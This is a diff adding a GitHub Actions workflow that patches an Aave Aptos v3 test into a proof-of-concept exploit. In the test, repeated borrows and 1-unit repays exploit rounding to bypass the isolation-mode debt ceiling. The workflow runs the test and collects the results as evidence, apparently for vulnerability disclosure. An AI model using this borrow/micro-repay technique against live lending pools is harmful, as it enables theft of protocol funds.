@@ -1,0 +1,265 @@
+name: Aave Aptos isolation ceiling E2E v2
+
+on:
+  push:
+    branches:
+      - aave-aptos-isolation-ceiling-e2e-20260814
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+
+    steps:
+      - name: Checkout exact Aave source
+        uses: actions/checkout@v4
+        with:
+          repository: aave/aptos-aave-v3
+          ref: 919362ba93c6291b25a31282b25d3def6e6357b9
+          path: aave
+          persist-credentials: false
+
+      - name: Install Aptos CLI 9.5.0
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          mkdir -p "$HOME/.local/bin"
+          curl -fsSL -o /tmp/aptos.zip \
+            https://github.com/aptos-labs/aptos-core/releases/download/aptos-cli-v9.5.0/aptos-cli-9.5.0-Linux-x86_64.zip
+          unzip -q /tmp/aptos.zip -d "$HOME/.local/bin"
+          chmod +x "$HOME/.local/bin/aptos"
+          echo "$HOME/.local/bin" >> "$GITHUB_PATH"
+          "$HOME/.local/bin/aptos" --version
+
+      - name: Prepare deterministic named addresses
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          mkdir -p evidence
+          ORACLE=0x40
+          ORACLE_RACC="$(
+            aptos account derive-resource-account-address \
+              --address "$ORACLE" \
+              --seed AAVE_ORACLE \
+              --seed-encoding Utf8 | jq -r '.Result'
+          )"
+          NAMED="aptos_std=0x1,aave_acl=0x10,aave_config=0x20,aave_math=0x30,aave_oracle=$ORACLE,aave_pool=0x50,aave_large_packages=0x60,aave_mock_underlyings=0x70,aave_data=0x80,data_feeds=0x90,platform=0xa0,aave_oracle_racc_address=$ORACLE_RACC"
+          {
+            echo "ORACLE_RACC=$ORACLE_RACC"
+            echo "NAMED=$NAMED"
+          } | tee evidence/environment.txt
+          echo "AAVE_NAMED_ADDRESSES=$NAMED" >> "$GITHUB_ENV"
+
+      - name: Patch isolation-mode test with ceiling-bypass invariants
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          cat > patch_isolation_test.py <<'PY'
+          from pathlib import Path
+
+          path = Path("aave/aave-core/tests/aave-logic/borrow_logic_tests.move")
+          text = path.read_text(encoding="utf-8")
+          needle = "fun test_borrow_with_isolation_mode("
+          start = text.index(needle)
+          brace = text.index("{", start)
+          depth = 0
+          end = None
+          for index in range(brace, len(text)):
+              char = text[index]
+              if char == "{":
+                  depth += 1
+              elif char == "}":
+                  depth -= 1
+                  if depth == 0:
+                      end = index + 1
+                      break
+          if end is None:
+              raise RuntimeError("target function boundary not found")
+
+          block = text[start:end]
+          block = block.replace(
+              needle,
+              "fun zdb_test_isolation_mode_repay_rounding_bypasses_debt_ceiling(",
+              1,
+          )
+          old_ceiling = """        pool_configurator::set_debt_ceiling(
+              aave_pool, underlying_u2_token_address, 10000
+          );"""
+          new_ceiling = """        pool_configurator::set_debt_ceiling(
+              aave_pool, underlying_u2_token_address, 1
+          );"""
+          if old_ceiling not in block:
+              raise RuntimeError("debt ceiling anchor not found")
+          block = block.replace(old_ceiling, new_ceiling, 1)
+
+          tail_marker = "        // User 2 borrow 10 U_1 to user 2\n"
+          tail_start = block.index(tail_marker)
+          exploit_tail = r"""        aptos_framework::aptos_coin_tests::mint_apt_fa_to_primary_fungible_store_for_test(
+              user2_address, 10_000_000_000
+          );
+
+          let u1_reserve_data = pool::get_reserve_data(underlying_u1_token_address);
+          let u2_reserve_data = pool::get_reserve_data(underlying_u2_token_address);
+          let u1_reserve_config =
+              pool::get_reserve_configuration_by_reserve_data(u1_reserve_data);
+          let debt_ceiling_unit =
+              math_utils::pow(
+                  10,
+                  reserve_config::get_decimals(&u1_reserve_config)
+                      - reserve_config::get_debt_ceiling_decimals()
+              );
+          let variable_debt_token_address =
+              pool::get_reserve_variable_debt_token_address(u1_reserve_data);
+
+          let cycle = 0;
+          while (cycle < 10) {
+              borrow_logic::borrow(
+                  user2,
+                  underlying_u1_token_address,
+                  debt_ceiling_unit,
+                  2,
+                  0,
+                  user2_address
+              );
+              let tracked_after_borrow =
+                  pool::get_reserve_isolation_mode_total_debt(u2_reserve_data);
+              assert!(tracked_after_borrow == 1, 0xC001);
+
+              let debt_before_micro_repay =
+                  variable_debt_token_factory::balance_of(
+                      user2_address, variable_debt_token_address
+                  );
+              borrow_logic::repay(
+                  user2,
+                  underlying_u1_token_address,
+                  1,
+                  2,
+                  user2_address
+              );
+              let tracked_after_micro_repay =
+                  pool::get_reserve_isolation_mode_total_debt(u2_reserve_data);
+              let debt_after_micro_repay =
+                  variable_debt_token_factory::balance_of(
+                      user2_address, variable_debt_token_address
+                  );
+              assert!(tracked_after_micro_repay == 0, 0xC002);
+              assert!(debt_after_micro_repay < debt_before_micro_repay, 0xC003);
+              assert!(debt_before_micro_repay - debt_after_micro_repay <= 2, 0xC004);
+              cycle = cycle + 1;
+          };
+
+          let tracked_after_cycles =
+              pool::get_reserve_isolation_mode_total_debt(u2_reserve_data);
+          let actual_debt_after_cycles =
+              variable_debt_token_factory::balance_of(
+                  user2_address, variable_debt_token_address
+              );
+          assert!(tracked_after_cycles == 0, 0xC005);
+          assert!(actual_debt_after_cycles > debt_ceiling_unit * 9, 0xC006);
+
+          borrow_logic::borrow(
+              user2,
+              underlying_u1_token_address,
+              debt_ceiling_unit,
+              2,
+              0,
+              user2_address
+          );
+          let tracked_final =
+              pool::get_reserve_isolation_mode_total_debt(u2_reserve_data);
+          let actual_debt_final =
+              variable_debt_token_factory::balance_of(
+                  user2_address, variable_debt_token_address
+              );
+          let actual_debt_ceiling_units =
+              math_utils::ceil_div(actual_debt_final, debt_ceiling_unit);
+
+          aptos_std::debug::print(&debt_ceiling_unit);
+          aptos_std::debug::print(&tracked_final);
+          aptos_std::debug::print(&actual_debt_final);
+          aptos_std::debug::print(&actual_debt_ceiling_units);
+
+          assert!(tracked_final == 1, 0xC007);
+          assert!(actual_debt_ceiling_units >= 11, 0xC008);
+          assert!(
+              actual_debt_final
+                  > (tracked_final as u256) * debt_ceiling_unit * 10,
+              0xC009
+          );
+          """
+          block = block[:tail_start] + exploit_tail + "\n    }"
+          patched = text[:start] + block + text[end:]
+          path.write_text(patched, encoding="utf-8")
+          PY
+
+          python3 patch_isolation_test.py
+          git -C aave diff --check
+          git -C aave diff -- aave-core/tests/aave-logic/borrow_logic_tests.move \
+            | tee evidence/isolation_ceiling_test.patch
+          cp patch_isolation_test.py evidence/
+          cp aave/aave-core/tests/aave-logic/borrow_logic_tests.move \
+            evidence/patched_borrow_logic_tests.move
+
+      - name: Run exploit E2E three times
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          run_move_test() {
+            local log="$1"
+            aptos move test \
+              --ignore-compile-warnings \
+              --skip-attribute-checks \
+              --package-dir aave/aave-core \
+              --language-version 2.3 \
+              --compiler-version 2.0 \
+              --named-addresses "$AAVE_NAMED_ADDRESSES" \
+              --filter zdb_test_isolation_mode_repay_rounding_bypasses_debt_ceiling \
+              2>&1 | tee "$log"
+          }
+          run_move_test evidence/targeted-run-1.log
+          run_move_test evidence/targeted-run-2.log
+          run_move_test evidence/targeted-run-3.log
+          echo "TARGETED_REPEAT_PASS=3/3" | tee evidence/targeted-status.txt
+
+      - name: Run borrow-logic regression set
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          aptos move test \
+            --ignore-compile-warnings \
+            --skip-attribute-checks \
+            --package-dir aave/aave-core \
+            --language-version 2.3 \
+            --compiler-version 2.0 \
+            --named-addresses "$AAVE_NAMED_ADDRESSES" \
+            --filter borrow_logic_tests \
+            2>&1 | tee evidence/borrow-logic-regression.log
+
+      - name: Record source and environment
+        if: always()
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          {
+            echo "SOURCE_REVISION=$(git -C aave rev-parse HEAD)"
+            echo "SOURCE_TREE=$(git -C aave rev-parse HEAD^{tree})"
+            echo "APTOS_VERSION=$(aptos --version)"
+            echo "WORKFLOW_SHA=$GITHUB_SHA"
+            echo "RUN_ID=$GITHUB_RUN_ID"
+          } | tee evidence/provenance.txt
+          cp aave/aave-core/sources/aave-logic/isolation_mode_logic.move evidence/
+          cp aave/aave-core/sources/aave-logic/borrow_logic.move evidence/
+          sha256sum evidence/* > evidence/SHA256SUMS.txt
+
+      - name: Upload isolation-ceiling evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: aave-aptos-isolation-ceiling-evidence-v2
+          path: evidence
+          if-no-files-found: error
+          retention-days: 14
